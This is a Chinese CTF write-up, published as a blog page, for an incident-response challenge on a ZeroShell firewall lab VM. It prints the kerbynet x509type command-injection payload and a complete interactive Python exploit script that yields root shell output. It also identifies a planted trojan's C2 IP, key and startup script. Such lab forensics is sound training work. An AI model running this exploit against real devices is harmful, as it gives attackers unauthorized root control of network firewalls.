@@ -1,0 +1,138 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>应急响应-zeroshell | 1ux4ry Archive</title><meta name=description content="ccb2024-初赛应急响应"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><a href=#1环境安装>1、环境安装</a></li><li><a href=#2配置网络>2、配置网络</a></li><li><a href=#1从数据包中找出攻击者利用漏洞开展攻击的会话攻击者执行了一条命令写出该会话中设置的flag-结果提交形式flagxxxxxxxxx>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}</a></li><li><a href=#2通过漏洞利用获取设备控制权限然后查找设备上的flag文件提取flag文件内容结果提交形式flagxxxxxxxxxx>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}</a></li><li><a href=#3找出受控机防火墙设备中驻留木马的外联域名或ip地址结果提交形式flagxxxx如flagwwwabccom-或-flag161223344>3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{www.abc.com} 或 flag{16.122.33.44}</a></li><li><a href=#4请写出木马进程执行的本体文件的名称结果提交形式flagxxxxx仅写文件名不加路径>4.请写出木马进程执行的本体文件的名称，结果提交形式:flag{xxxxx}，仅写文件名不加路径</a></li><li><a href=#5请提取驻留的木马本体文件通过逆向分析找出木马样本通信使用的加密密钥结果提交形式flagxxxx>5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式:flag{xxxx}</a></li><li><a href=#6请写出驻留木马的启动项注意写出启动文件的完整路径结果提交形式flagxxxx如flagabc>6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式:flag{xxxx}，如flag{/a/b/c}</a></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label=应急响应-zeroshell><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./CTF</p><div class=article-hero-card__title><span class=article-hero-card__title-main>CTF</span>
+<span class=article-hero-card__title-sub>应急响应-zeroshell</span></div><p class=article-hero-card__meta>CTF / Misc / 应急响应 / 取证 / Web / CTF / Misc / 应急响应 / 取证 / Web / 1ux4ry Archive</p><p class=article-hero-card__desc>ccb2024-初赛应急响应</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>CTF</p><h1>应急响应-zeroshell</h1><div class=single-meta><span>2026-06-16</span>
+<span>CTF / Misc / 应急响应 / 取证 / Web</span>
+<span># CTF # Misc # 应急响应 # 取证 # Web</span></div></header><div class="page-copy content-body"><h1 id=1环境安装>1、环境安装</h1><p>解压环境zeroshell.7z，使用vmware17或以上版本加载zeroshell虚拟机</p><h1 id=2配置网络>2、配置网络</h1><p>1，打开虚拟网络编辑器</p><p>2、选择VMnet8 Net模式网卡，选择更改配置</p><p>3、选择VMnet8 网络，修改子网IP为61.139.2.0，再点击应用和确定</p><p>4、启动虚拟机，等虚拟机启动完成后，浏览器打开http://61.139.2.100 即可访问zeroshell防火墙环境</p><h1 id=1从数据包中找出攻击者利用漏洞开展攻击的会话攻击者执行了一条命令写出该会话中设置的flag-结果提交形式flagxxxxxxxxx>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}</h1><p>工具一把梭了<figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161614782.png alt=image.png loading=lazy decoding=async></figure></p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161627699.png alt=image.png loading=lazy decoding=async></figure></p><p>flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}</p><h1 id=2通过漏洞利用获取设备控制权限然后查找设备上的flag文件提取flag文件内容结果提交形式flagxxxxxxxxxx>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}</h1><p>在流量包中找到攻击payload<br><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161643965.png alt=image.png loading=lazy decoding=async></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nl>http</span><span class=p>:</span><span class=c1>//61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#39;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#39;ls /&#39;%0A&#39;
+</span></span></span></code></pre></div><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161659762.png alt=image.png loading=lazy decoding=async></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nl>http</span><span class=p>:</span><span class=c1>//61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#39;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#39;cat /Database/flag&#39;%0A&#39;
+</span></span></span></code></pre></div><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161714530.png alt=image.png loading=lazy decoding=async></figure></p><p>flag{c6045425-6e6e-41d0-be09-95682a4f65c4}</p><h1 id=3找出受控机防火墙设备中驻留木马的外联域名或ip地址结果提交形式flagxxxx如flagwwwabccom-或-flag161223344>3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{www.abc.com} 或 flag{16.122.33.44}</h1><p>这个我们可以进行用poc 直接打 也可以进行反弹shell</p><p>我们进行poc打</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>logging</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Disable warnings from urllib3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>urllib3</span><span class=o>.</span><span class=n>disable_warnings</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Set up logging</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>basicConfig</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=n>logging</span><span class=o>.</span><span class=n>INFO</span><span class=p>,</span> <span class=nb>format</span><span class=o>=</span><span class=s1>&#39;</span><span class=si>%(asctime)s</span><span class=s1> - </span><span class=si>%(levelname)s</span><span class=s1> - </span><span class=si>%(message)s</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_arguments</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span><span class=o>=</span><span class=s1>&#39;Exploit ZeroShell 3.9.0 Remote Command Execution vulnerability.&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-u&#39;</span><span class=p>,</span> <span class=s1>&#39;--url&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Base target URI (e.g., http://target-uri/)&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_target</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#39;%0Aid%0A&#39;&#34;</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>response</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;ZeroShell 3.9.0 Remote Command Execution&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Successfully connected to target&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>return</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Failed to connect to </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s1>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_command</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#39;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#39;</span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s2>&#39;%0A&#39;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>uri_vuln</span> <span class=o>=</span> <span class=n>url</span> <span class=o>+</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-US,en;q=0.5&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;Accept-Encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;gzip, deflate&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;Connection&#34;</span><span class=p>:</span> <span class=s2>&#34;close&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;Upgrade-Insecure-Requests&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>uri_vuln</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>response</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>end_index</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>rindex</span><span class=p>(</span><span class=s2>&#34;&lt;html&gt;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>[:</span><span class=n>end_index</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Failed to execute command on </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s1>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=n>parse_arguments</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>check_target</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>url</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;$ &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>cmd</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;exit&#39;</span><span class=p>,</span> <span class=s1>&#39;quit&#39;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>execute_command</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>url</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></div><p>发现能够打通</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>PS</span> <span class=nl>Z</span><span class=p>:</span><span class=err>\</span><span class=n>Desktop</span><span class=o>&gt;</span> <span class=n>python</span> <span class=mf>2.</span><span class=n>py</span> <span class=o>-</span><span class=n>u</span> <span class=nl>http</span><span class=p>:</span><span class=c1>//61.139.2.100/
+</span></span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>12</span><span class=o>-</span><span class=mi>19</span> <span class=mi>09</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>,</span><span class=mi>500</span> <span class=o>-</span> <span class=n>INFO</span> <span class=o>-</span> <span class=n>ZeroShell</span> <span class=mf>3.9.0</span> <span class=n>Remote</span> <span class=n>Command</span> <span class=n>Execution</span>
+</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>12</span><span class=o>-</span><span class=mi>19</span> <span class=mi>09</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>,</span><span class=mi>500</span> <span class=o>-</span> <span class=n>INFO</span> <span class=o>-</span> <span class=n>Successfully</span> <span class=n>connected</span> <span class=n>to</span> <span class=n>target</span>
+</span></span><span class=line><span class=cl><span class=err>$</span> <span class=n>id</span>
+</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span>
+</span></span></code></pre></div><p>然后将Poc中的放到ai中检查外联或者放到工具箱中也行</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161728529.png alt=image.png loading=lazy decoding=async></figure></p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161743611.png alt=image.png loading=lazy decoding=async></figure></p><p>可疑确定外链地址就是</p><p>flag{202.115.89.103}</p><h1 id=4请写出木马进程执行的本体文件的名称结果提交形式flagxxxxx仅写文件名不加路径>4.请写出木马进程执行的本体文件的名称，结果提交形式:flag{xxxxx}，仅写文件名不加路径</h1><p>在linux每个运行中的进程在/proc下都有一个对应的目录，名称为进程ID。这些目录包含了多个文件和子目录，记录了进程的状态、资源使用等信息</p><p>ls -l /proc/17515/</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161758477.png alt=image.png loading=lazy decoding=async></figure></p><p>flag{.nginx}</p><h1 id=5请提取驻留的木马本体文件通过逆向分析找出木马样本通信使用的加密密钥结果提交形式flagxxxx>5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式:flag{xxxx}</h1><p>我们已经找到了木马文件.nginx,直接cat就是文件的ascii,不好提取，我们可以用到xxd命令只显示16进制把他16进制提取出来，去010导入16进制</p><p>然后导入ida中，发现是<figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161809271.png alt=image.png loading=lazy decoding=async></figure></p><p>flag{11223344qweasdzxc}</p><h1 id=6请写出驻留木马的启动项注意写出启动文件的完整路径结果提交形式flagxxxx如flagabc>6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式:flag{xxxx}，如flag{/a/b/c}</h1><p>查看环境变量</p><p>env<figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161834710.png alt=image.png loading=lazy decoding=async></figure></p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161845242.png alt=image.png loading=lazy decoding=async></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>register</span><span class=o>/</span><span class=n>system</span><span class=o>/</span><span class=n>startup</span><span class=o>/</span><span class=n>scripts</span><span class=o>/</span><span class=n>nat</span><span class=o>/</span><span class=ne>File</span>
+</span></span><span class=line><span class=cl><span class=n>cp</span> <span class=o>/</span><span class=n>Database</span><span class=o>/.</span><span class=n>nginx</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/.</span><span class=n>nginx</span>
+</span></span><span class=line><span class=cl><span class=n>chmod</span> <span class=o>+</span><span class=n>x</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/.</span><span class=n>nginx</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>tmp</span><span class=o>/.</span><span class=n>nginxcp</span> <span class=o>/</span><span class=n>Database</span><span class=o>/.</span><span class=n>nginx</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/.</span><span class=n>nginx</span>
+</span></span><span class=line><span class=cl><span class=n>chmod</span> <span class=o>+</span><span class=n>x</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/.</span><span class=n>nginx</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>tmp</span><span class=o>/.</span><span class=n>nginx</span>
+</span></span></code></pre></div><p>flag{/var/register/system/startup/scripts/nat/File}</p></div><div class=single-tags><a href=/tags/ctf/># CTF</a>
+<a href=/tags/misc/># Misc</a>
+<a href=/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/># 应急响应</a>
+<a href=/tags/%E5%8F%96%E8%AF%81/># 取证</a>
+<a href=/tags/web/># Web</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
